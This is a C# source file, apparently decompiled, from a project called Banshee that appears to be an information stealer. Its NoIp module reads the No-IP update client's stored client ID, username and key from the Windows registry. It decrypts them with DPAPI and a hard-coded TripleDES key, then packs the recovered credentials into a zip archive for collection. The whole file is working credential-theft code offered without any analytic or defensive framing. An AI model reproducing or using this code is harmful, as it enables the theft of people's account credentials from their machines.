﻿using System;
using System.Security.Cryptography;
using System.Text;
using Banshee.Helper.Data;
using Banshee.Helper.Encrypted;
using Microsoft.Win32;

namespace Banshee.Targets.Applications
{
	// Token: 0x020000A0 RID: 160
	public class NoIp : ITarget
	{
		// Token: 0x060001DA RID: 474 RVA: 0x0000FBEC File Offset: 0x0000FBEC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "SOFTWARE\\Vitalwerks\\DUC\\v4";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text))
			{
				if (registryKey != null)
				{
					object value = registryKey.GetValue("CKey");
					object value2 = registryKey.GetValue("CID");
					object value3 = registryKey.GetValue("UserName");
					if (value != null || value2 != null || value3 != null)
					{
						string text2 = this.DecryptString((byte[])value2);
						string text3 = this.DecryptString((byte[])value);
						string text4 = this.DecryptString((byte[])value3);
						string text5 = "NoIp\\Credentials.txt";
						Counter.CounterApplications counterApplications = new Counter.CounterApplications();
						counterApplications.Name = "NoIp";
						counterApplications.Files.Add(text + " => " + text5);
						counterApplications.Files.Add(text5);
						zip.AddTextFile(text5, string.Concat(new string[]
						{
							"clientid: ",
							text2,
							"\nlogin: ",
							text4,
							"\npassword hash: ",
							text3
						}));
						counter.Applications.Add(counterApplications);
					}
				}
			}
		}

		// Token: 0x060001DB RID: 475 RVA: 0x0000FD14 File Offset: 0x0000FD14
		private string DecryptString(byte[] message)
		{
			string result;
			try
			{
				if (message == null)
				{
					result = null;
				}
				else
				{
					byte[] array = DpApi.Decrypt(message);
					if (array == null)
					{
						result = null;
					}
					else
					{
						byte[] key = new byte[]
						{
							127,
							238,
							115,
							104,
							83,
							74,
							138,
							240,
							49,
							50,
							224,
							252,
							103,
							181,
							23,
							117
						};
						using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
						{
							tripleDESCryptoServiceProvider.Key = key;
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
							using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor())
							{
								byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
								result = Encoding.UTF8.GetString(bytes);
							}
						}
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}
	}
}
